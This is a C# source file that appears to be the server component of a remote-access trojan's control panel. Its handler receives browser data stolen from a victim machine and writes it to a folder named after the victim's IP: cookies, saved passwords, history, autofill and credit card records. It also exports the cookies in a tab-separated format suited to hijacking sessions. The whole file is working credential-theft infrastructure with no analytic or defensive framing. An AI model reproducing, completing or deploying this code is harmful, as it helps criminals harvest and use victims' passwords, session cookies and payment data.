using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using MessagePackLib.MessagePack;
using Newtonsoft.Json;
using Server.Connection;
using Stealer;

namespace Server.Handle_Packet;

public class HandleRecovery
{
	public HandleRecovery(Clients client, MsgPack unpack_msgpack)
	{
		try
		{
			string text = Path.Combine(Application.StartupPath, "ClientsFolder", client.Ip, "Recovery");
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			string asString = unpack_msgpack.ForcePathObject("data").AsString;
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			BrsInfo brsInfo = JsonConvert.DeserializeObject<BrsInfo>(asString);
			File.WriteAllText(text + "\\cookies.json", JsonConvert.SerializeObject(brsInfo.listcookie, Formatting.Indented));
			File.WriteAllText(text + "\\passwords.json", JsonConvert.SerializeObject(brsInfo.listps, Formatting.Indented));
			File.WriteAllText(text + "\\bookmark.json", JsonConvert.SerializeObject(brsInfo.listbmark, Formatting.Indented));
			File.WriteAllText(text + "\\history.json", JsonConvert.SerializeObject(brsInfo.listhist, Formatting.Indented));
			File.WriteAllText(text + "\\autofill.json", JsonConvert.SerializeObject(brsInfo.listautofill, Formatting.Indented));
			File.WriteAllText(text + "\\credit.json", JsonConvert.SerializeObject(brsInfo.listcredit, Formatting.Indented));
			string path = text + "\\cookies.txt";
			File.Delete(path);
			foreach (Cookie item in brsInfo.listcookie)
			{
				File.AppendAllText(path, $"{item.domain}\t{item.hostOnly}\t{item.path}\t{item.httpOnly}\t{item.expirationDate}\t{item.name}\t{item.value}\n".Replace("False", "FALSE").Replace("True", "TRUE"));
			}
			Program.mainform.AddRecoveryClient(client.Ip);
			new HandleLogs().Addmsg("Client " + client.Ip + " password recoveried success，file located @ ClientsFolder \\ " + client.Ip + " \\ Recovery", Color.Purple);
			client?.Disconnected();
		}
		catch (Exception ex)
		{
			new HandleLogs().Addmsg(ex.Message, Color.Red);
		}
	}
}
